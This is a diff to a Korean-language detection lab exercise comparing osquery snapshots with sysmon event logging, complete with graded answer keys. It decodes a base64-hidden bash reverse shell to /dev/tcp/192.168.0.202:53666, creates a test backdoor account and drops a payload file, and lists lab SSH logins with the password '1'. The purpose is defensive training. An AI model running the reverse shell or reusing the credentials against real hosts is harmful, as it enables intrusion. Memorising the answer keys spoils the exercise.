@@ -19,14 +19,14 @@ description: |
   스냅샷이 놓치는 단명·인코딩 프로세스를 sysmon 이벤트가 잡는 대비를 직접 본다. 반대로 지속 상태(백도어
   계정)는 osquery 스냅샷이 강한 영역임을 확인해 두 도구의 역할 분담을 정리한다.
 
-  공격은 `docker exec el34-web …`, sysmon 관측은 호스트의 `/var/log/syslog`(Linux-Sysmon 소스, ccc=adm
+  공격은 `ssh ccc@10.20.32.80 …`, sysmon 관측은 호스트의 `/var/log/syslog`(Linux-Sysmon 소스, ccc=adm
   그룹이라 sudo 불필요). sysmon 데몬 자체는 영속 인프라(유지). 실습이 만든 계정/파일/프로세스만
   self-clean — el34 호스트는 공유 자원이므로 흔적을 끝까지 남기지 않는 것까지가 SOP 다.
 difficulty: hard
 duration_minutes: 200
 prerequisites:
   - "W07(osquery 스냅샷) · W09–W10(Wazuh) 통과"
-  - "el34 호스트 SSH(ssh ccc@{{TARGET_IP}}) + docker exec"
+  - "장비 직접 SSH: ssh ccc@<장비IP>(fw 10.20.30.1/ips 31.2/web 32.80/siem 32.100) + 공격 ssh att@192.168.0.202 (비번 1)"
   - "lecture §1(스냅샷 vs 이벤트) §5(ProcessCreate) §6-§7(Net/File) 숙지"
 objectives:
   - "스냅샷(osquery)과 이벤트 스트림(sysmon)의 본질적 차이를 설명하고, 단명·인코딩 위협이 왜 스냅샷의 사각인지 근거를 댄다"
@@ -118,8 +118,8 @@ steps:
       echo "=== base64 페이로드 디코드 ==="
       echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDIvNTM2NjYgMD4mMQo=' | base64 -d
       echo ""
-      echo "→ bash 리버스셸: /dev/tcp/10.20.30.202/53666 로 셸을 되돌림"
-    answer_detail: "base64 로 위장한 명령을 -d 로 디코드하면 'bash -i >& /dev/tcp/10.20.30.202/53666 0>&1' 리버스셸이 드러난다 — 피해 호스트가 10.20.30.202:53666 으로 거꾸로 셸을 되돌린다는 뜻. 방화벽이 '밖→안'은 막아도 '안→밖'은 허용하는 점을 노린 우회다. 핵심: sysmon ProcessCreate(EventID 1)는 이 디코딩/실행 명령의 cmdline 자체를 event 로 남기므로, 인코딩으로 위장해도 사후에 '무엇을 디코드해 실행했나'를 복원할 수 있다. 판정: 출력에 dev/tcp 가 보이면 의도 식별 성공."
+      echo "→ bash 리버스셸: /dev/tcp/192.168.0.202/53666 로 셸을 되돌림"
+    answer_detail: "base64 로 위장한 명령을 -d 로 디코드하면 'bash -i >& /dev/tcp/192.168.0.202/53666 0>&1' 리버스셸이 드러난다 — 피해 호스트가 192.168.0.202:53666 으로 거꾸로 셸을 되돌린다는 뜻. 방화벽이 '밖→안'은 막아도 '안→밖'은 허용하는 점을 노린 우회다. 핵심: sysmon ProcessCreate(EventID 1)는 이 디코딩/실행 명령의 cmdline 자체를 event 로 남기므로, 인코딩으로 위장해도 사후에 '무엇을 디코드해 실행했나'를 복원할 수 있다. 판정: 출력에 dev/tcp 가 보이면 의도 식별 성공."
     verify:
       type: output_contains
       expect: 'dev/tcp'
@@ -147,7 +147,7 @@ steps:
 
       ## 💻 실행 명령
 
-      **실행 위치:** 단명 프로세스 실행·osquery 는 `el34-web`(`docker exec -it el34-web bash`),
+      **실행 위치:** 단명 프로세스 실행·osquery 는 `el34-web`(`ssh ccc@10.20.32.80`),
       sysmon syslog 관측은 **el34 호스트**(컨테이너 아님)에서.
 
       ```bash
@@ -171,10 +171,10 @@ steps:
     category: detect
     points: 18
     answer: |
-      docker exec el34-web python3 -c "import base64; base64.b64decode('aGk=')  # w11 revshell sim" 2>/dev/null
+      ssh ccc@10.20.32.80 python3 -c "import base64; base64.b64decode('aGk=')  # w11 revshell sim" 2>/dev/null
       sleep 2
       echo "=== osquery 스냅샷 (이미 종료된 프로세스 → 못 찾음) ==="
-      docker exec el34-web osqueryi --json 'SELECT pid,cmdline FROM processes WHERE cmdline LIKE "%b64decode%";'
+      ssh ccc@10.20.32.80 osqueryi --json 'SELECT pid,cmdline FROM processes WHERE cmdline LIKE "%b64decode%";'
       echo "=== sysmon ProcessCreate (생성 순간 syslog에 보존) ==="
       grep -a "Linux-Sysmon" /var/log/syslog | grep -a "b64decode" | tail -1 | grep -ao "CommandLine>[^<]*" | head -1
     answer_detail: "핵심 대비 — 단명/인코딩 프로세스는 osquery 스냅샷(조사 시점에 살아 있어야 보임)이 놓치지만(빈 배열 [] 반환), sysmon ProcessCreate(EventID 1)는 생성된 그 순간의 전체 cmdline 을 syslog 에 남긴다. 프로세스가 죽은 뒤에도 '무엇을 실행했나'를 추적 가능 — sysmon 의 존재 이유. osquery 의 빈 결과는 실패가 아니라 스냅샷의 본질적 한계를 드러내는 것이다. 판정: sysmon 쪽 출력에 b64decode 가 포함된 ProcessCreate 가 보이면 성공."
@@ -278,11 +278,11 @@ steps:
     category: detect
     points: 14
     answer: |
-      docker exec el34-web sh -c 'echo payload > /tmp/w11_payload.b64'
+      ssh ccc@10.20.32.80 'echo payload > /tmp/w11_payload.b64'
       sleep 2
       echo "=== sysmon FileCreate (w11_payload) ==="
       grep -a "Linux-Sysmon" /var/log/syslog | grep -a "<EventID>11<" | grep -a "w11_payload" | tail -1 | cut -c1-200
-      docker exec el34-web sh -c 'rm -f /tmp/w11_payload.b64'
+      ssh ccc@10.20.32.80 'rm -f /tmp/w11_payload.b64'
       echo "self-clean done"
     answer_detail: "FileCreate(EventID 11)는 페이로드 파일 생성의 순간을 남긴다 — 곧바로 삭제해도 생성 event는 syslog에 보존. Wazuh FIM realtime(W10)과 같은 발상, 다른 소스(eBPF). 파일 drop 추적의 핵심."
     verify:
@@ -311,7 +311,7 @@ steps:
 
       ## 💻 실행 명령
 
-      **실습 컨테이너:** `el34-web` — `docker exec -it el34-web bash` 로 접속해 실행한다.
+      **WAF/웹 장비:** `ssh ccc@10.20.32.80`(비번 `1`)로 접속해 실행한다.
 
       ```bash
       userdel -r smonbd 2>/dev/null; useradd -m -s /bin/bash smonbd && echo created
@@ -328,10 +328,10 @@ steps:
     category: response
     points: 12
     answer: |
-      docker exec el34-web sh -c 'userdel -r smonbd 2>/dev/null; useradd -m -s /bin/bash smonbd && echo created'
+      ssh ccc@10.20.32.80 'userdel -r smonbd 2>/dev/null; useradd -m -s /bin/bash smonbd && echo created'
       echo "=== osquery 백도어 계정 사냥 ==="
-      docker exec el34-web osqueryi --json 'SELECT username,uid,shell FROM users WHERE username="smonbd";'
-      docker exec el34-web sh -c 'userdel -r smonbd 2>/dev/null; echo removed'
+      ssh ccc@10.20.32.80 osqueryi --json 'SELECT username,uid,shell FROM users WHERE username="smonbd";'
+      ssh ccc@10.20.32.80 'userdel -r smonbd 2>/dev/null; echo removed'
       echo "self-clean done"
     answer_detail: "백도어 계정은 '지속 상태'라 osquery 스냅샷이 강한 영역(조사 시점에 존재하면 무조건 보임). 단명 프로세스(sysmon만 잡음)와 달리 도구 역할이 나뉜다 — sysmon=순간 이벤트, osquery=상태 스냅샷."
     verify:
@@ -415,7 +415,7 @@ steps:
       cat <<'EOF'
       # el34 W11 Sysmon 보고서
       ## 1. 호스트 sysmon(eBPF): 컨테이너 프로세스까지 포착, syslog Linux-Sysmon
-      ## 2. base64 리버스셸: bash -i >& /dev/tcp/10.20.30.202/53666
+      ## 2. base64 리버스셸: bash -i >& /dev/tcp/192.168.0.202/53666
       ## 3. sysmon 이벤트 스트림
       | EventID | 종류 | 포착 |
       |---------|------|------|
@@ -465,7 +465,7 @@ steps:
     category: cleanup
     points: 5
     answer: |
-      docker exec el34-web sh -c 'id smonbd 2>/dev/null && echo "계정 잔재!" || echo "user ok"; ls /tmp/w11_payload.b64 2>/dev/null && echo "payload 잔재!" || echo "file ok"'
+      ssh ccc@10.20.32.80 'id smonbd 2>/dev/null && echo "계정 잔재!" || echo "user ok"; ls /tmp/w11_payload.b64 2>/dev/null && echo "payload 잔재!" || echo "file ok"'
       pgrep -f "http.server 53666" && echo "리스너 잔재!" || echo "listener ok"
       echo "sysmon(영속 유지): $(systemctl is-active sysmon)"
       echo "---check done---"
